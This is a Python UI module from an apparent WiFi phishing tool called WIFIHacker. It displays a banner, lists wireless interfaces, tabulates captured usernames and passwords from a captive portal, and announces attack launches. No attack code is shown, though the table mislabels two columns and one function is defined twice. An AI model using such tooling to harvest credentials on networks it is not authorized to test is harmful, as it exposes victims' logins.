#!/usr/bin/env python

"""
WIFIHacker - Wireless Penetration Testing Tool
----------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : WIFIHacker - A tool for WiFi auditing, penetration testing, and security assessments.

License     : Open-source for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is meant strictly for educational, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you don’t own or have permission to test is illegal.
❗ If you use or modify this code, GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and against the open-source community principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' hard work and give credit where it's due.

"""


from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from includes.portal import get_credentials_json
import os


console = Console()


def clear():
    os.system("clear")

def show_banner():
    os.system("clear")
    ascii_art = """
                                                                        v1.0
██╗    ██╗██╗███████╗██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██║██╔════╝██║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗  ██║███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██║██╔══╝  ██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║     ██║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                   [bold green] Author: @karthithehacker
                                                Website: Karthithehacker.com                                                                    
                                                     
"""
    console = Console()
    console.print(ascii_art, style="bold cyan")
    

def show_credentials():
    clear()
    table = Table(title="[bold magenta]Captured Credentials[/bold magenta]", show_header=True, header_style="bold blue")
    table.add_column("Username", style="bold green")
    table.add_column("Password")
    table.add_column("Date/Time")
    table.add_column("Template")
    table.add_column("Client IP")
    table.add_column("Device Info")

    creds = get_credentials_json()
    for c in creds:
        table.add_row(c['username'], c['password'], c['datetime'], c['template'], c['useragent'], c['ip'])
    show_banner()
    console.print(table)
    console.input("\n[bold yellow]↩️ Press Enter to go back... [/bold yellow]")


def nowifi():
    console.print("[bold red]❌ No WiFi interfaces found![/bold red]")
    exit()

def wifi_available(interfaces):
    options = "\n".join([f"{i+1}. [cyan]{iface}[/cyan]" for i, iface in enumerate(interfaces)])
    options += "\n0. [bold red]Back to Main Menu[/bold red]"
    console.print(Panel.fit(f"📡 [bold yellow]Available WiFi Interfaces:[/bold yellow]\n\n{options}", title="Choose Interface", style="bold green"))


def invalid_Selection():
    console.print("[bold red]❌ Invalid selection![/bold red]")

def bye():
    console.print("[red]👋 Goodbye![/red]")

def not_implemented():
    print("\n[red]❌ Option not implemented yet.[/red]")


def credentials(cred):

            console.print(Panel.fit(f"""
[bold green]Captured Credentials[/bold green]
[bold]Username:[/bold] {cred.get("username")}
[bold]Password:[/bold] {cred.get("password")}
[bold]Time    :[/bold] {cred.get("datetime")}
[bold]IP      :[/bold] {cred.get("ip")}
[bold]UserAgent:[/bold] {cred.get("useragent")}
""", title="🔐 New Login", border_style="green"))
            

def wifiphish(inf,attack_mode,wifiname):
     console.print(Panel.fit(f"""
[bold]Attack Mode:[/bold] {attack_mode}
[bold]Device     :[/bold] {inf}
[bold]Wifi Name  :[/bold] {wifiname}
[bold]Stop       :[/bold] CTRL+C 
""", title="🚨 Launching Wifi Attack", border_style="red"))
     
def wifiphish(interface, attack_mode, ssid_name, ssid_count):
     console.print(Panel.fit(f"""
[bold]Attack Mode:[/bold] {attack_mode}
[bold]Device     :[/bold] {interface}
[bold]Wifi Name  :[/bold] {ssid_name}
[bold]Wifi count :[/bold] {ssid_count}
[bold]Stop       :[/bold] CTRL+C 
""", title="🚨 Launching Wifi Attack", border_style="red"))